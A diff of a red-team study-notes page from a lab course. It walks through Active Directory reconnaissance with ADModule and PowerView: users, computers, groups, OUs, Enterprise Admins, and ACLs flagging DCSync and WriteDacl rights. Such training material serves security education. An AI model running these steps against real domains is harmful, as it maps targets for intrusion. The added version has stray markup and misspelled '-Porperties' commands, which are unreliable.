@@ -1,146 +1,12 @@
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>CRTM - Phase 1 - Sections 1/2 - Mr Stark Study Notes</title>
-  <link rel="shortcut icon" href="../../assets/images/logo.ico" type="image/x-icon">
-  <link rel="stylesheet" href="../../assets/css/style.css">
-  <link rel="preconnect" href="https://fonts.googleapis.com">
-  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600&display=swap" rel="stylesheet">
-  <style>
-    .crtm-sidebar { padding: 20px; }
-    .crtm-sidebar h3 { color: #70ffdb; margin-bottom: 15px; font-size: 1.1rem; }
-    .crtm-sidebar .portfolio-link { 
-      display: block; 
-      padding: 10px 12px; 
-      margin-bottom: 15px; 
-      color: #70ffdb; 
-      text-decoration: none; 
-      border-radius: 6px; 
-      font-size: 0.9rem; 
-      font-weight: 600;
-      background: #2a2a2a;
-      transition: all 0.2s;
-    }
-    .crtm-sidebar .portfolio-link:hover { 
-      background: #70ffdb; 
-      color: #1a1a1a; 
-    }
-    .crtm-sidebar a { display: block; padding: 8px 12px; margin: 4px 0; color: #d6d6d6; text-decoration: none; border-radius: 6px; font-size: 0.9rem; transition: all 0.2s; }
-    .crtm-sidebar a:hover { background: #2a2a2a; color: #70ffdb; }
-    .crtm-sidebar a.active { background: #70ffdb; color: #1a1a1a; font-weight: 600; }
-    .main-content { max-width: 100% !important; }
-    .about { max-width: 100% !important; padding: 20px 40px !important; }
-    .notion-content { line-height: 1.6; }
-    .notion-content img { max-width: 100%; height: auto; margin: 20px 0; border-radius: 8px; }
-    .notion-content h1, .notion-content h2, .notion-content h3 { color: #fafafa; margin: 20px 0 10px; }
-    .notion-content p { margin: 15px 0; color: #d6d6d6; }
-    .notion-content ul, .notion-content ol { margin: 15px 0; padding-left: 30px; }
-    .notion-content li { margin: 5px 0; color: #d6d6d6; }
-    .notion-content code { background: #2a2a2a; padding: 2px 6px; border-radius: 4px; font-family: 'Courier New', monospace; color: #70ffdb; }
-    .notion-content pre { background: #1e1e1e; border-left: 4px solid #70ffdb; padding: 15px; margin: 20px 0; border-radius: 0 8px 8px 0; overflow-x: auto; }
-    .notion-content a { color: #70ffdb; text-decoration: underline; }
-    .notion-content strong { color: #fafafa; font-weight: 600; }
-    .notion-content figure { margin: 20px 0; }
-    .notion-content pre code { display: block; white-space: pre-wrap; word-break: break-all; }
-    .toggle { margin: 15px 0; }
-    .toggle details { background: #1e1e1e; border-radius: 8px; padding: 10px; }
-    .toggle summary { cursor: pointer; color: #70ffdb; font-weight: 600; margin-bottom: 10px; }
-    .course-navigation { display: flex; justify-content: space-between; margin-top: 40px; padding-top: 20px; border-top: 1px solid #333; }
-    .course-navigation a { color: #70ffdb; text-decoration: none; padding: 10px 20px; border-radius: 6px; transition: all 0.2s; }
-    .course-navigation a:hover { background: #2a2a2a; }
-    .course-navigation .prev-link { margin-right: auto; }
-    .course-navigation .next-link { margin-left: auto; }
-  </style>
-</head>
-<body>
-  <main>
-    <aside class="sidebar" data-sidebar>
-      <div class="sidebar-info">
-        <figure class="avatar-box">
-          <img src="../../assets/images/my-avatar.png?v=3" alt="Mr Stark" width="80">
-        </figure>
-        <div class="info-content">
-          <h1 class="name" title="Mr Stark">Mr Stark</h1>
-          <p class="title">CRTM Study Notes</p>
-        </div>
-        <button class="info_more-btn" data-sidebar-btn>
-          <span>Show Navigation</span>
-          <ion-icon name="chevron-down"></ion-icon>
-        </button>
-      </div>
-      <div class="sidebar-info_more">
-        <div class="separator"></div>
-        <div class="crtm-sidebar">
-          <a href="../../" class="portfolio-link">← Portfolio</a>
-          <h3>Phases</h3>
-          <a href="index.html">Overview</a>
-
-          <a href="part-01-phase-1-sections-1-2.html" class="active">Phase 1 - Sections 1/2</a>
-          <a href="part-02-phase-2-sections-3-4-5.html">Phase 2 - Sections 3/4/5</a>
-          <a href="part-03-phase-3-sections-3-6.html">Phase 3 - Sections 3/6</a>
-          <a href="part-04-phase-4-section-7.html">Phase 4 - Section 7</a>
-          <a href="part-05-phase-5-section-8.html">Phase 5 - Section 8</a>
-          <a href="part-06-phase-6-section-9.html">Phase 6 - Section 9</a>
-          <a href="part-07-phase-7-section-10.html">Phase 7 - Section 10</a>
-          <a href="part-08-phase-8-sections-11-12.html">Phase 8 - Sections 11/12</a>
-        </div>
-        <div class="separator"></div>
-        <ul class="contacts-list">
-          <li class="contact-item">
-            <div class="icon-box">
-              <ion-icon name="arrow-back-outline"></ion-icon>
-            </div>
-            <div class="contact-info">
-              <p class="contact-title">Back</p>
-              <a href="../../../" class="contact-link">Portfolio</a>
-            </div>
-          </li>
-        </ul>
-      </div>
-    </aside>
-
-    <div class="main-content">
-      <article class="about active" data-page="about">
-        <header class="h2 article-title">Phase 1 - Sections 1/2</header>
-        <section class="about-text notion-content">
-<figure><img src="../../assets/crtm/00-Sections_1and2.png" alt="Sections 1 and 2"/></figure>
-
-<p>We will be focusing our enumeration using <strong>ADModule</strong> and also a <strong>PowerView</strong> module.</p>
-
-<p>ADModule and PowerView are two popular tools used in Red Team engagements for Active Directory enumeration and post-exploitation. ADModule is a PowerShell module that leverages native .NET assemblies to interact with Active Directory, providing a set of cmdlets for querying AD objects, users, groups, and policies. It is efficient for performing enumeration tasks in environments where native AD tools are not available or where stealth is a priority.</p>
-
-<p>PowerView, on the other hand, is a part of PowerSploit and is specifically designed for offensive security. It provides comprehensive functionality for enumerating domain information, identifying misconfigurations, and performing user and group enumeration. PowerView is known for its versatility and is commonly used during lateral movement and privilege escalation in Active Directory environments. While both modules serve similar purposes, ADModule tends to use more native approaches, while PowerView is tailored for stealth and comprehensive domain enumeration in Red Team operations.</p>
-
-<p><code>NOTE: be aware that, it's not good to import ADModule and PowerView on the same session. Better keep them imported into separate sessions.</code></p>
-
-<p>Once uploading ADModule into our machine we must import ADModule into our PowerShell session.</p>
-
-<p><code>Import-Module .\Microsoft.ActiveDirectory.Management.dll</code></p>
-
-<p><code>Import-Module .\ActiveDirectory\ActiveDirectory.psd1</code></p>
-
-<figure><img src="../../assets/crtm/image 2.png" alt="ADModule Import"/></figure>
-
-<p>That makes perfect sense! The issue was indeed related to how you imported the module.</p>
-
-<p>When you only import the <code><strong>Microsoft.ActiveDirectory.Management.dll</strong></code>, you're essentially loading just the core AD management library, which doesn't include all the necessary cmdlets and functions that are typically loaded when you properly import the full module using the <code><strong>.psd1</strong></code> file.</p>
-
-<p>By correctly importing the <code><strong>.\ActiveDirectory\ActiveDirectory.psd1</strong></code> file, you load the entire module, including all the additional functionalities and cmdlets that are designed to work together, providing the complete set of properties and expected output.</p>
-
-<h1>Enumerating Users</h1>
-
-<p>The first think we must always do when we do have access to a valid domain user, is to retrieve a list of all the valid users we do have inside the current domain we are.</p>
-
-<p><code>Get-ADUser -Filter *</code></p>
-
-<p><code>Get-ADUser -Filter * | Select -ExpandProperty 'SamAccountName'</code></p>
-
-<details class="toggle">
-<summary><strong>AD-Users</strong></summary>
-<pre><code>Administrator
+<section class="about-text notion-content">
+<html><body><li><details open=""><summary><strong>Phase - 1 - Sections 1/2</strong></summary><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="ltr"><figure class="image"><a><img style="width:708px"/></a></figure></div><div dir="auto"><p class="">We will be focusing our enumeration using <strong>ADModule</strong> and also a <strong>PowerView</strong> module.<br/></p></div><div dir="auto"><p class="">ADModule and PowerView are two popular tools used in Red Team engagements for Active Directory enumeration and post-exploitation. ADModule is a PowerShell module that leverages native .NET assemblies to interact with Active Directory, providing a set of cmdlets for querying AD objects, users, groups, and policies. It is efficient for performing enumeration tasks in environments where native AD tools are not available or where stealth is a priority.</p></div><div dir="auto"><p class="">PowerView, on the other hand, is a part of PowerSploit and is specifically designed for offensive security. It provides comprehensive functionality for enumerating domain information, identifying misconfigurations, and performing user and group enumeration. PowerView is known for its versatility and is commonly used during lateral movement and privilege escalation in Active Directory environments. While both modules serve similar purposes, ADModule tends to use more native approaches, while PowerView is tailored for stealth and comprehensive domain enumeration in Red Team operations. </p></div><div dir="auto"><p class=""><code>NOTE: be aware that, it’s not good to import ADModule and PowerView on the same session. Better keep them imported into separate sessions. </code></p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Once uploading ADModule into our machine we must import ADModule into our PowerShell session.</p></div><div dir="auto"><p class=""><code>Import-Module .\Microsoft.ActiveDirectory.Management.dll</code></p></div><div dir="auto"><p class=""><code>Import-Module .\ActiveDirectory\ActiveDirectory.psd1</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">That makes perfect sense! The issue was indeed related to how you imported the module.</p></div><div dir="auto"><p class="">When you only import the <code><strong>Microsoft.ActiveDirectory.Management.dll</strong></code>, you’re essentially loading just the core AD management library, which doesn't include all the necessary cmdlets and functions that are typically loaded when you properly import the full module using the <code><strong>.psd1</strong></code> file.</p></div><div dir="auto"><p class="">By correctly importing the <code><strong>.\ActiveDirectory\ActiveDirectory.psd1</strong></code> file, you load the entire module, including all the additional functionalities and cmdlets that are designed to work together, providing the complete set of properties and expected output.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h1 class="">Enumerating Users</h1></div><div dir="auto"><p class="">The first think we must always do when we do have access to a valid domain user, is to retrieve a list of all the valid users we do have inside the current domain we are.</p></div><div dir="auto"><p class=""><code>Get-ADUser -Filter *</code></p></div><div dir="auto"><p class=""><code>Get-ADUser -Filter * | Select -ExpandProperty 'SamAccountName'</code></p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>AD-Users</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">Administrator
+<pre><code>
 Guest
+</code></pre>
 krbtgt
 GCB$
 appmanager
@@ -154,7 +20,7 @@ orgadmin
 JillRuffin
 JoseBarclay
 StaceyValenti
-AlexisReurer
+AlexisReuter
 EricValdez
 TheodoreHanna
 BillyOdom
@@ -521,7 +387,7 @@ KyleMendoza
 MichaelGallo
 WilliamHubbard
 TamalaWorden
-DremaMcCarver
+DreamaMcCarver
 EddieChan
 ShawnaMitchell
 DanielGreen
@@ -844,24 +710,8 @@ ITEmployee45
 ITEmployee46
 ITEmployee47
 ITEmployee48
-ITEmployee49</code></pre>
-</details>
-
-<p>As it is possible to see, we do have a huge number of users inside the current domain. if we really want to know the total number of users inside this domain, we can use the <code><strong>Measure-Object </strong></code>and this will count and deliver the total number of users.</p>
-
-<p><code>(Get-ADUser -Filter * | Select -ExpandProperty 'SamAccountName' | Measure-Object).Count</code></p>
-
-<figure><img src="../../assets/crtm/image 3.png" alt="User Count"/></figure>
-
-<h1>Enumerating Computers</h1>
-
-<p><code>Get-ADComputer -Filter *</code></p>
-
-<p><code>Get-ADComputer -Filter * | Select -ExpandProperty 'SamAccountName'</code></p>
-
-<details class="toggle">
-<summary><strong>AD-Computers</strong></summary>
-<pre><code>IT-DC$
+ITEmployee49</code></pre></div></details></li></ul></div><div dir="auto"><p class="">As it is possible to see, we do have a huge number of users inside the current domain. if we really want to know the total number of users inside this domain, we can use the <code><strong>Measure-Object </strong></code>and this will count and deliver the total number of users.</p></div><div dir="auto"><p class=""><code>(Get-ADUser -Filter * | Select -ExpandProperty 'SamAccountName' | Measure-Object).Count</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.88330078125px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h1 class="">Enumerating Computers</h1></div><div dir="auto"><p class=""><code>Get-ADComputer -Filter *</code></p></div><div dir="auto"><p class=""><code>Get-ADComputer -Filter * | Select -ExpandProperty 'SamAccountName'</code></p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>AD-Computers</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">IT-DC$
 IT-PREPROD$
 IT-SQLSRV02$
 IT-APPSRV01$
@@ -919,27 +769,17 @@ IT-EMPLOYEE45$
 IT-EMPLOYEE46$
 IT-EMPLOYEE47$
 IT-EMPLOYEE48$
-IT-EMPLOYEE49$</code></pre>
-</details>
-
-<p><code>(Get-ADComputer -Filter * | Select -ExpandProperty 'SamAccountName' | Measure-Object).Count</code></p>
-
-<figure><img src="../../assets/crtm/image 4.png" alt="Computer Count"/></figure>
-
-<h1>Enumerating Groups</h1>
-
-<p><code>Get-ADGroup -Filter *</code></p>
-
-<p><code>Get-ADGroup -Filter * | Select -ExpandProperty 'SamAccountName'</code></p>
-
-<details class="toggle">
-<summary><strong>AD-Groups</strong></summary>
-<pre><code>Administrators
+IT-EMPLOYEE49$</code></pre></div></details></li></ul></div><div dir="auto"><p class=""><code>(Get-ADComputer -Filter * | Select -ExpandProperty 'SamAccountName' | Measure-Object).Count</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h1 class="">Enumerating Groups</h1></div><div dir="auto"><p class=""><code>Get-ADGroup -Filter *</code></p></div><div dir="auto"><p class=""><code>Get-ADGroup -Filter * | Select -ExpandProperty 'SamAccountName'</code></p></div><div dir="auto"><ul class="toggle"><li><details open=""><summary><strong>AD-Groups</strong></summary><div dir="auto"><pre class="code code-wrap"><code class="language-Bash">Administrators
+<pre><code>
 Users
 Guests
+</code></pre>
 Print Operators
 Backup Operators
+<pre><code>
 Replicator
+</code></pre>
 Remote Desktop Users
 Network Configuration Operators
 Performance Monitor Users
@@ -979,213 +819,42 @@ DnsAdmins
 DnsUpdateProxy
 LocalAdmins
 ITEmployeesMachines
+<pre><code>
 Services
+</code></pre>
 ITEmployeesUsers
-organizationadmins</code></pre>
-</details>
-
-<p>It is possible to see above the list of Groups inside this domain, and we can by looking at the list, spot that we do have several non-standard groups here and this already catches my attention.
-Here are the non-standard groups from our list. These groups are not part of the default Active Directory groups and likely represent custom or organizational-specific groups:</p>
-
-<ol>
-<li><strong>LocalAdmins</strong></li>
-<li><strong>ITEmployeesMachines</strong></li>
-<li><strong>Services</strong></li>
-<li><strong>ITEmployeesUsers</strong></li>
-<li><strong>organizationadmins</strong></li>
-</ol>
-
-<p>Now lets move a bit further on this enumeration... Let's go over one by one of the groups we just found inside the target domain and check the attributes of one specific group of our interest.</p>
-
-<p><code>Get-ADGroup -Identity 'LocalAdmins' -Properties *</code></p>
-
-<figure><img src="../../assets/crtm/image 5.png" alt="LocalAdmins Group"/></figure>
-
-<p><code>Get-ADGroup -Identity 'ITEmployeesMachines' -Properties *</code></p>
-
-<figure><img src="../../assets/crtm/image 7.png" alt="ITEmployeesMachines Group"/></figure>
-
-<p><code>Get-ADGroupMember -Identity 'ITEmployeesMachines' | Select -ExpandProperty 'SamAccountName'</code></p>
-
-<figure><img src="../../assets/crtm/image 8.png" alt="ITEmployeesMachines Members"/></figure>
-
-<p><code>Get-ADGroup -Identity 'Services' -Properties *</code></p>
-
-<figure><img src="../../assets/crtm/image 9.png" alt="Services Group"/></figure>
-
-<p><code>Get-ADGroupMember -Identity 'Services' | Select -ExpandProperty 'SamAccountName'</code></p>
-
-<figure><img src="../../assets/crtm/image 10.png" alt="Services Members"/></figure>
-
-<p><code>Get-ADGroup -Identity 'ITEmployeesUsers' -Properties *</code></p>
-
-<figure><img src="../../assets/crtm/image 11.png" alt="ITEmployeesUsers Group"/></figure>
-
-<p><code>Get-ADGroupMember -Identity 'ITEmployeesUsers' | Select -ExpandProperty 'SamAccountName'</code></p>
-
-<figure><img src="../../assets/crtm/image 12.png" alt="ITEmployeesUsers Members"/></figure>
-
-<p><code>Get-ADGroup -Identity 'OrganizationAdmins' -Properties *</code></p>
-
-<figure><img src="../../assets/crtm/image 13.png" alt="OrganizationAdmins Group"/></figure>
-
-<p><code>Get-ADGroupMember -Identity 'OrganizationAdmins' | Select -ExpandProperty 'SamAccountName'</code></p>
-
-<figure><img src="../../assets/crtm/image 14.png" alt="OrganizationAdmins Members"/></figure>
-
-<p>Let's now enumerate some of the important standard Active Directory groups worth it enumeration.</p>
-
-<p>Domain Admins</p>
-
-<p><code>Get-ADGroup -Identity 'Domain Admins' -Properties *</code></p>
-
-<figure><img src="../../assets/crtm/image 15.png" alt="Domain Admins Group"/></figure>
-
-<p><code>Get-ADGroupMember -Identity 'Domain Admins' | Select -ExpandProperty 'SamAccountName'</code></p>
-
-<figure><img src="../../assets/crtm/image 16.png" alt="Domain Admins Members"/></figure>
-
-<h3>Special Group</h3>
-
-<p>There is a special case here for a special group. There is a Group named '<code>Enterprise Admins'</code></p>
-
-<figure><img src="../../assets/crtm/image 17.png" alt="Enterprise Admins"/></figure>
-
-<p>The <strong>Enterprise Admins group</strong> is a highly privileged security group in a Microsoft Active Directory (AD) forest. It exists only in the <strong>root domain</strong> of the AD forest and grants its members administrative privileges across the entire forest, including all child domains. Members of this group have the ability to manage any domain, Domain Controllers (DCs), and critical AD components across the forest.</p>
-
-<p>From an <strong>offensive security perspective</strong>, enumerating the <strong>Enterprise Admins</strong> group is crucial because it provides insight into who holds the <strong>keys to the forest</strong>, opening pathways to achieve <strong>forest dominance</strong>.</p>
-
-<p>The explanation above is the reason why we do receive the error when we tried to enumerate the enterprise Admins group, we are inside a child domain <code><strong>it.gcb.local</strong></code>.</p>
-
-<p>By specifying the <code>-Server</code> parameter and pointing it to the <strong>root domain</strong> (<code>it.gcb.local</code>), the command will direct the query to the correct location where the <strong>Enterprise Admins group</strong> resides, allowing the enumeration to succeed.</p>
-
-<p><code>Get-ADGroup -Identity 'Enterprise Admins' -Properties * -Server 'gcb.local'</code></p>
-
-<figure><img src="../../assets/crtm/image 18.png" alt="Enterprise Admins with Server"/></figure>
-
-<h3>Why Did the Query Work with <code>Server</code> and the Root Domain?</h3>
-
-<ul>
-<li><strong>Specifying the Root Domain</strong>:
-<ul>
-<li>By adding the <code>Server</code> parameter and pointing it to the <strong>root domain controller</strong> (<code>gcb.local</code>), the query is explicitly directed to the correct domain where the <strong>Enterprise Admins group</strong> resides.</li>
-</ul>
-<ul>
-<li>The <strong>Enterprise Admins group</strong> is located in the <strong>root domain</strong> of the forest (<code>gcb.local</code>) because it is a group that provides forest-wide administrative access.</li>
-</ul>
-</li>
-</ul>
-
-<p>We now can retrieve the information from Enterprise Admins group and we can also enumerate the members of this group.</p>
-
-<p><code>Get-ADGroupMember -Identity 'Enterprise Admins' -Server 'gcb.local' | Select -ExpandProperty 'SamAccountName'</code></p>
-
-<figure><img src="../../assets/crtm/image 19.png" alt="Enterprise Admins Members"/></figure>
-
-<p>Well, we can see above that only the Administrator is part of this special group.</p>
-
-<p><code>Get-ADGroup -Identity 'Administrators' -Properties *</code></p>
-
-<figure><img src="../../assets/crtm/image 20.png" alt="Administrators Group"/></figure>
-
-<p><code>Get-ADGroupMember -Identity 'Administrators' | Select -ExpandProperty 'SamAccountName'</code></p>
-
-<figure><img src="../../assets/crtm/image 21.png" alt="Administrators Members"/></figure>
-
-<p>We can also see that. the Domain Administrator and also members of groups Domain Admins and Enterprise Admins area also part of the Administrators group.</p>
-
-<h2>Enumerating Organizational Units</h2>
-
-<p>Let's now start enumerating all the Organizational Units we have configured in this domain.</p>
-
-<p><code>Get-ADOrganizationalUnit -Filter *</code></p>
-
-<figure><img src="../../assets/crtm/image 22.png" alt="Organizational Units"/></figure>
-
-<p><code>Get-ADOrganizationalUnit -Filter * | Select -Expandproperty 'Name'</code></p>
-
-<figure><img src="../../assets/crtm/image 23.png" alt="OU Names"/></figure>
-
-<p>Let's use <code><strong>Domain Controllers</strong></code> <strong>OU</strong> and list all the computers inside this OU.</p>
-
-<p><code>Get-ADOrganizationalUnit -Identity 'OU=Domain Controllers,DC=it,DC=gcb,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code></p>
-
-<figure><img src="../../assets/crtm/image 24.png" alt="Domain Controllers OU"/></figure>
-
-<p><code>Get-ADOrganizationalUnit -Identity 'OU=AppServers,DC=it,DC=gcb,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code></p>
-
-<figure><img src="../../assets/crtm/image 25.png" alt="AppServers OU"/></figure>
-
-<p><code>Get-ADOrganizationalUnit -Identity 'OU=ITEmployees,DC=it,DC=gcb,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code></p>
-
-<figure><img src="../../assets/crtm/image 26.png" alt="ITEmployees OU"/></figure>
-
-<p><code>Get-ADOrganizationalUnit -Identity 'OU=PreProd,DC=it,DC=gcb,DC=local' | %{Get-ADComputer -SearchBase $_ -Filter *} | Select name</code></p>
-
-<figure><img src="../../assets/crtm/image 27.png" alt="PreProd OU"/></figure>
-
-<p>During our OU enumeration, we mapped out the organizational structure of the domain to better understand how assets, users, and groups are logically separated and managed. This process allowed us to identify custom OUs like ITEmployees, which often hold valuable targets such as workstations, service accounts, and employee groups. By analyzing the distinguished names and hierarchy, we gained visibility into the administrative boundaries and delegation models within the environment. This also helped us pinpoint high-value areas for privilege escalation and lateral movement, especially where group policies or access controls might be misconfigured.</p>
-
-<h2>Enumerating ACLs</h2>
-
-<p>Instead of enumerating the each ACLs on the domain, I decided to do it differently. I decided to use Find-InterestingDomainACL which is a module from PowerView that allows us to verify really interesting ACLs by passing the user or even groups as well. For example, it will show us if a specific user or group  itself have some interesting ACLs like GenericAll, GenericWrite, etc over an Object.</p>
-
-<p><code>Import-Module .\PowerView.ps1</code></p>
-
-<p><code>Find-InterestingDomainACL -ResolveGUIDs -Verbose</code></p>
-
-<h3>orgadmin User - Domain Replication Rights</h3>
-
-<p>The <strong>orgadmin</strong> user has the <strong>DS-Replication-Get-Changes</strong>, <strong>DS-Replication-Get-Changes-All</strong>, and <strong>DS-Replication-Get-Changes-In-Filtered-Set</strong> rights. These permissions grant the ability to replicate directory data, including sensitive information such as password hashes. This user can effectively perform <strong>DCSync attacks</strong>, making it a high-value target.</p>
-
-<h3>organizationadmins Group - WriteDacl</h3>
-
-<p>The <strong>organizationadmins</strong> group has <strong>WriteDacl</strong> permissions on the domain root. This allows modifying the domain's Access Control List (ACL), which can be leveraged to perform various attacks such as adding new users, modifying group memberships, or even creating new domain admins.</p>
-
-<p><code>Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'employee41'}</code></p>
-
-<figure><img src="../../assets/crtm/image 28.png" alt="ACL for employee41"/></figure>
-
-<p><code>Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'ITEmployees'}</code></p>
-
-<figure><img src="../../assets/crtm/image 29.png" alt="ACL for ITEmployees"/></figure>
-
-<p><code>Find-InterestingDomainACL -ResolveGUIDs | ?{$_.IdentityReferenceName -Match 'LocalAdmins'}</code></p>
-
-<figure><img src="../../assets/crtm/image 30.png" alt="ACL for LocalAdmins"/></figure>
-
-<h2><strong>Enumerating Domain, Forest &amp; Trusts</strong></h2>
-
-<p><code>Import-Module .\Microsoft.ActiveDirectory.Management.dll</code></p>
-
-<p><code>Import-Module .\ActiveDirectory\ActiveDirectory.psd1</code></p>
-
-<p><code>Get-ADForest</code></p>
-
-<figure><img src="../../assets/crtm/image 31.png" alt="AD Forest"/></figure>
-
-<p>This command quickly maps the forest's structure, identifies key servers (e.g., Domain Controllers, Global Catalogs), and highlights potential targets for attacks or lateral movement.</p>
-
-<p>The <code>Get-ADForest</code> command enumerates the structure and key components of the Active Directory <strong>forest</strong>. It provides a summary of:</p>
-
-<ol>
-<li><strong>Domains</strong>: Lists all domains in the forest (e.g., <code>gcb.local</code> and <code>it.gcb.local</code>).</li>
-<li><strong>FSMO Roles</strong>: Shows which domain controllers hold the Flexible Single Master Operation roles, crucial for domain operations.</li>
-</ol>
-
-<p><code>(Get-ADForest).Domains</code></p>
-
-<figure><img src="../../assets/crtm/image 32.png" alt="Forest Domains"/></figure>
-
-<h3>Enumerating Trusts</h3>
-
-<p>We can also map or enumerate all the Trusts we do have from the current domain we are part of (<code><strong>it.gcb.local</strong></code>).</p>
-
-<p><code>Get-ADTrust -Filter *</code></p>
-
-<details class="toggle">
-<summary><strong>AD-Trust</strong></summary>
-<pre><code>Direction               : BiDirectional
+organizationadmins</code></pre></div></details></li></ul></div><div dir="auto"><p class="">It is possible to see above the list of Groups inside this domain, and we can by looking at the list, spot that we do have several non-standard groups here and this already catches my attention.<br/>Here are the non-standard groups from our list. These groups are not part of the default Active Directory groups and likely represent custom or organizational-specific groups:</p></div><div dir="auto"><ol class="numbered-list" start="1" type="1"><li><strong>LocalAdmins</strong></li></ol></div><div dir="auto"><ol class="numbered-list" start="2" type="1"><li><strong>ITEmployeesMachines</strong></li></ol></div><div dir="auto"><ol class="numbered-list" start="3" type="1"><li><strong>Services</strong></li></ol></div><div dir="auto"><ol class="numbered-list" start="4" type="1"><li><strong>ITEmployeesUsers</strong></li></ol></div><div dir="auto"><ol class="numbered-list" start="5" type="1"><li><strong>organizationadmins</strong></li></ol></div><div dir="auto"><p class="">Now lets move a bit further on this enumeration… Let’s go over one by one of the groups we just found inside the target domain and check the attributes of one specific group of our interest. </p></div><div dir="auto"><p class=""><code>Get-ADGroup -Identity 'LocalAdmins' -Porperties *</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">Using the Get-ADGroupMember we can also enumerate and confirm members (User/Computer) that belong to LocalAdmins group.</p></div><div dir="auto"><p class=""><code>Get-ADGroupMember -Identity 'LocalAdmins' | Select -ExpandProperty 'SamAccountName'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.88330078125px"/></a></figure></div><div dir="auto"><p class="">It is possible to see from our enumeration that <code>paadmin</code> and <code>ITEmployee43</code> are part of <strong>LocalAdmins</strong> group.<br/>Let’s now do the same enumeration for the remain groups as well.</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroup -Identity 'ITEmployeesMachines' -Porperties *</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroupMember -Identity 'ITEmployeesMachines' | Select -ExpandProperty 'SamAccountName'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroup -Identity 'Services' -Properties *</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroupMember -Identity 'Services' | Select -ExpandProperty 'SamAccountName’</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code> Get-ADGroup -Identity 'ITEmployeesUsers' -Properties *</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroupMember -Identity 'ITEmployeesUsers' | Select -ExpandProperty 'SamAccountName'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9833984375px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroup -Identity 'OrganizationAdmins' -Properties *</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroupMember -Identity 'OrganizationAdmins' | Select -ExpandProperty 'SamAccountName'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">Let’s now enumerate some of the important standard Active Directory groups worth it enumeration.</p></div><div dir="auto"><p class="">Domain Admins</p></div><div dir="auto"><p class=""><code>Get-ADGroup -Identity 'Domain Admins' -Properties *</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1653px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class=""><code>Get-ADGroupMember -Identity 'Domain Admins' | Select -ExpandProperty 'SamAccountName'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.9000244140625px"/></a></figure></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><p class="">
+</p></div><div dir="auto"><h3 class="">Special Group</h3></div><div dir="auto"><p class="">There is a special case here for a special group. There is a Group named ‘<code>Enterprise Admins'</code></p></div><div dir="ltr"><figure class="image"><a><img style="width:1652.933349609375px"/></a></figure></div><div dir="auto"><p class="">The <strong>Enterprise Admins group</strong> is a highly privileged security group in a Microsoft Active Directory (AD) forest. It exists only in the <strong>root domain</strong> of the AD forest and grants its members administrative privileges across the entire forest, including all child domains. Members of this group have the ability to manage any domain, Domain Controllers (DCs), and critical AD components across the forest. </p></div><div dir="auto"><p class="">From an <strong>offensive security perspective</strong>, enumerating the <strong>Enterprise Admins</strong> group is crucial because it provides insight into who holds the <strong>keys to the forest</strong>, opening pathways to achieve <strong>forest dominance</strong>.</p></div><div dir="auto"><p class="">The explanation above is the reason why we do receive the error when we tried to enumerate the enterprise Admins group, we are inside a child domain <code><strong>it.gcb.local</strong></code>.</p></div><div dir="auto"><p class="">
